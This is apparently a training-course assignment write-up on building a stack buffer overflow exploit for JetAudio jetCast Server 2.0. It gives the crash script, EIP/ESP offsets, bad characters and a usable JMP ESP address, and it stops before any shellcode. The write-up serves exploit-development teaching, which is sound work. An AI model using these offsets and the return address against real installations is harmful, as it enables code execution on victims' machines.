---
layout: post
title: Hands-on Exploit Development Assignment 1 by Michael Ross
comments: true
---
*This assignment was submitted as part of our ![Hands-on Exploit Development Course](https://www.udemy.com/hands-on-exploit-development/) by Michael Ross*

### Vulnerable Application

Exploit developed for JetAudio jetCast Server 2.0. Copy of vulnerable application obtained from ![Exploit-DB](https://www.exploit-db.com/apps/aa8b0ffe339644e7b73da49c72c1fb39-JCS2000.exe)

### Replicating the crash

As an initial step the crash was replicated. This was done to confirm the application is vulnerable and observe the behaviour during the crash. To replicate the crash the basic proof of concept script (https://www.exploit-db.com/exploits/46819) from exploit-db was used.

```python

#Steps to produce the crash:
#1.- Run python code: jetCast_Server_2.0.py
#2.- Open jetCast.txt and copy content to clipboard
#2.- Open jetCast Server
#3.- Select Config
#4.- In "Log directory" Paste ClipBoard
#5.- Click on "Ok"
#6.- Click on "Start"
#7.- Crashed
cod = "\x41" * 5000
f = open('jetCast.txt', 'w')
f.write(cod)
f.close()

```
Steps listed in the POC were followed and the crash occurred.

![](https://yaksas.in/wp-content/uploads/udemy-a1-mr/1.png)

Items of interest from analysing the output of the crash are below. This confirms the log directory configuration parameter is suspectible to a generic buffer overflow.
- EIP has been cleanly overwritten with A – 41414141
- ECX has been cleanly overwritten with A – 41414141
- ESP points to part of the A buffer - 0018EE54 – guess is this is right after the EIP location
- Other registers don’t appear to point to anything significant

### Finding the offset

As a next step the buffer offset which overwrites the identified registers needs to be confirmed. This is done to confirm where code needs to be replaced to manipulate program execution. To compare different techniques this was done manually using msf-pattern_create and using the functionality in monya.py.

#### Using msf-pattern_create

The POC was first updated with a 5000-character pattern created using msf-pattern_create. The crash was then re-triggered and output examined.

![](https://yaksas.in/wp-content/uploads/udemy-a1-mr/2.png)

Of interest:
- EIP points to 0x72413772 – querying this value gives an exact match at 532
```c
root@kali2019:~/Documents/exploits# msf-pattern_offset -l 5000 -q 72413772
[*] Exact match at offset 532
```
- ECX points to 0x72413372 – querying this value gives an exact match at 520
```c
root@kali2019:~/Documents/exploits# msf-pattern_offset -l 5000 -q 72413372
[*] Exact match at offset 520
```
- ESP points to part of the buffer - 0018EE54 – querying this value gives an exact match at 536. This confirms ESP is pointing directly after EIP.
```c
root@kali2019:~# msf-pattern_offset -l 5000 -q 8Ar9
[*] Exact match at offset 536
```
#### Using mona.py

Commands from https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/ were used to complete this step.
- !mona config -set workingfolder c:\exploit\%p
- !mona pattern_create 5000

The POC was first updated with a 5000-character pattern created using the pattern_create command. The crash was then re-triggered and output examined.

![](https://yaksas.in/wp-content/uploads/udemy-a1-mr/3.png)

Of interest:
- EIP points to 0x72413772 – querying this value gives us an exact match at 532
```c
!mona pattern_offset 0x72413772
!mona findmsp
Message= EIP contains normal pattern : 0x72413772 (offset 532)
```
- ECX points to 0x72413372 – querying this value gives us an exact match at 520
```c
!mona pattern_offset 0x72413372
!mona findmsp
Message= ECX contains normal pattern : 0x72413372 (offset 520)
```
- ESP points to part of the buffer - 0018EE54 – guess is this is right after the EIP location. Output of the !mona findmsp command confirms this:
```c
Message= ESP (0x0018ee54) points at offset 536 in normal pattern (length 4464)
```
### Validating offsets

Buffer overflow condition and EIP/ESP offsets have been identified. Target for exploit is to overwrite EIP with a JMP ESP instruction and then place target shellcode at ESP.
Based on the identified offsets POC code updated to:
```python
cod = "A" * 520 + "B" * 12 + "C" * 4 + "D" * 4464
f = open('jetCast.txt', 'w')
f.write(cod)
f.close()
```

Re-generating the file and re-triggering the exploit works as expected.

![](https://yaksas.in/wp-content/uploads/udemy-a1-mr/4.png)

- ESP is cleanly overwritten by all C values (confirms offset was correct)
- ECX points to the beginning of 8 B values. 12 were written via the POC so the last 4 are mangled by the program
- ESP points to the start of the D values. Noted as being in the range: 0018EE54 – 0018FFC4. Checking the difference between both addresses notes that all 4464 bytes in the final array were written. This should be more than sufficient space for shellcode.

### Identifying bad characters

#### Done manually

POC was updated to send normal list of bad characters in place of the ‘D’ values. 0x00 initially assumed as bad character so was removed from the initial set.

#### First run (255 bad characters submitted)

Triggering the exploit with 255 bad characters reveals the below in the dump.

```c
0018F0AC 01 02 03 04 05 06 07 08
0018F0B4 09 00 F4 02 30 F2 18 00 ..ô0ò.
0018F0BC 98 48 80 00 94 6A 01 10 ˜H€.”j
0018F0C4 D0 4F 03 10 40 1F 00 00 ÐO @..
0018F0CC 00 00 00 00 24 FD 18 00 ....$ý.
0018F0D4 3F ED 41 00 40 1F 00 00 ?íA.@..
0018F0DC 00 00 00 00 B0 F5 18 00 ....°õ.
```

Value returned suggests 0x0A is a bad character. This is due to it not being present in the dump and values following where it would be are mangled. Character removed from POC and exploit re-triggered.

#### Second run (254 bad characters submitted)

Triggering the exploit with 254 bad characters reveals the below in the dump.

```c
0018EE54 01 02 03 04 05 06 07 08
0018EE5C 09 0B 0C 00 D8 EF 18 00 ...Øï.
0018EE64 98 48 77 00 94 6A 01 10 ˜Hw.”j
0018EE6C D0 4F 03 10 40 1F 00 00 ÐO @..
0018EE74 00 00 00 00 24 FD 18 00 ....$ý.
```

Value returned suggests 0x0D is a bad character. This is due to it not being present in the dump and values following where it would be are mangled. Character removed from POC and exploit re-triggered.

#### Third run (253 bad characters submitted)

Triggering the exploit with 253 bad characters reveals the below in the dump.

```c
0018EE54 01 02 03 04 05 06 07 08
0018EE5C 09 0B 0C 0E 0F 10 11 12 . .
0018EE64 13 14 15 16 17 18 19 1A
0018EE6C 1B 1C 1D 1E 1F 20 21 22 - !"
0018EE74 23 24 25 26 27 28 29 2A #$%&'()*
0018EE7C 2B 2C 2D 2E 2F 30 31 32 +,-./012
0018EE84 33 34 35 36 37 38 39 3A 3456789:
0018EE8C 3B 3C 3D 3E 3F 40 41 42 ;<=>?@AB
0018EE94 43 44 45 46 47 48 49 4A CDEFGHIJ
0018EE9C 4B 4C 4D 4E 4F 50 51 52 KLMNOPQR
0018EEA4 53 54 55 56 57 58 59 5A STUVWXYZ
0018EEAC 5B 5C 5D 5E 5F 60 61 62 [\]^_`ab
0018EEB4 63 64 65 66 67 68 69 6A cdefghij
0018EEBC 6B 6C 6D 6E 6F 70 71 72 klmnopqr
0018EEC4 73 74 75 76 77 78 79 7A stuvwxyz
0018EECC 7B 7C 7D 7E 7F 80 81 82 {|}~€•‚
0018EED4 83 84 85 86 87 88 89 8A ƒ„…†‡ˆ‰Š
0018EEDC 8B 8C 8D 8E 8F 90 91 92 ‹OE•Ž‘’
0018EEE4 93 94 95 96 97 98 99 9A “”•–—˜™š
0018EEEC 9B 9C 9D 9E 9F A0 A1 A2 ›oe•žŸ ¡¢
0018EEF4 A3 A4 A5 A6 A7 A8 A9 AA £¤¥¦§¨©ª
0018EEFC AB AC AD AE AF B0 B1 B2 «¬®¯°±²
0018EF04 B3 B4 B5 B6 B7 B8 B9 BA ³´μ¶·¸¹º
0018EF0C BB BC BD BE BF C0 C1 C2 »¼½¾¿ÀÁÂ
0018EF14 C3 C4 C5 C6 C7 C8 C9 CA ÃÄÅÆÇÈÉÊ
0018EF1C CB CC CD CE CF D0 D1 D2 ËÌÍÎÏÐÑÒ
0018EF24 D3 D4 D5 D6 D7 D8 D9 DA ÓÔÕÖ×ØÙÚ
0018EF2C DB DC DD DE DF E0 E1 E2 ÛÜÝÞßàáâ
0018EF34 E3 E4 E5 E6 E7 E8 E9 EA ãäåæçèéê
0018EF3C EB EC ED EE EF F0 F1 F2 ëìíîïðñò
0018EF44 F3 F4 F5 F6 F7 F8 F9 FA óôõö÷øùú
0018EF4C FB FC FD FE FF ûüýþÿ
```
From visual inspection of the dump values all transmitted characters appear to have been written to memory. This indicates the only three bad characters are 0x00, 0x0A, 0x0D.

This suggests the only three bad characters are

### Validating bad char with Mona

Identified bad characters were then identified using mona.py functionality. Commands run to generate a bytearray for comparison are:
- !mona config -set workingfolder c:\logs\%p
- !mona bytearray -cpb "\x00\x0A\x0D"

Byte array was then copied into the POC and exploit was re-triggered. Mona was then used to examine the portion of memory at ESP against the generated bytearray.
- !mona compare -f c:\logs\JCServer\bytearray.bin -a 0018EE54

Running the compare command then returns success. This confirms the only bad characters are 0x00, 0x0A, 0x0D.
```c
[+] Comparing with memory at location : 0x0018ee54 (Stack)
!!! Hooray, normal shellcode unmodified !!!
Bytes omitted from input: 00 0a 0d
```

### Controlling the Execution
#### System # 1 (Microsoft Windows 6.1.7601 Service Pack 1 Build 7601)

Approach taken is to overwrite the EIP register with a JMP ESP instruction. Shellcode can then be placed at the ESP location in memory.

To improve exploit reliability a JMP ESP instruction not affected by memory protection is the target. Mona used to identify modules not protected by memory protection methods.
- !mona modules -cm aslr=false,rebase=false,safeseh=false
This identified three modules which may have a reliable usable JMP ESP command.

```c
<SNIP>
0BADF00D 0x77ed0000 | 0x77f31000 | 0x00061000 | False | False | False | False | False | 6.00.8168.0 [MSVCP60.dll] (C:\Program Files (x86)\JetCast Server\MSVCP60.dll)
0BADF00D 0x00400000 | 0x00446000 | 0x00046000 | False | False | False | False | False | 2.0.0.4308 [JCServer.exe] (C:\Program Files (x86)\JetCast Server\JCServer.exe)
0BADF00D 0x5f400000 | 0x5f4f2000 | 0x000f2000 | False | False | False | False | False | 6.00.8665.0 [MFC42.DLL] (C:\Program Files (x86)\JetCast Server\MFC42.DLL)
<SNIP>
```

The identified modules were then searched for a JMP ESP instruction. Amended output of command is below.
- !mona jmp -r ESP -m MSVCP60*,JCServer*,MFC42*

```c
<SNIP>
0BADF00D [+] Results : 
77EF9D55 0x77ef9d55 : jmp esp | {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8168.0 (C:\Program Files (x86)\JetCast Server\MSVCP60.dll) 
77EE5D4F 0x77ee5d4f : push esp # ret | {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8168.0 (C:\Program Files (x86)\JetCast Server\MSVCP60.dll) 
5F4774D5 0x5f4774d5 : push esp # ret | {PAGE_EXECUTE_READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8665.0 (C:\Program Files (x86)\JetCast Server\MFC42.DLL) 
5F4955C4 0x5f4955c4 : push esp # ret | {PAGE_EXECUTE_READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8665.0 (C:\Program Files (x86)\JetCast Server\MFC42.DLL) 
5F49948D 0x5f49948d : push esp # ret | {PAGE_EXECUTE_READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8665.0 (C:\Program Files (x86)\JetCast Server\MFC42.DLL)
<SNIP>
```
Addresses found in JCServer.exe were not suitable due to containing a bad character (0x00). Remaining addresses are shown above. 0x77ef9d55 picked as it gives a solid JMP ESP that does not contain any bad characters
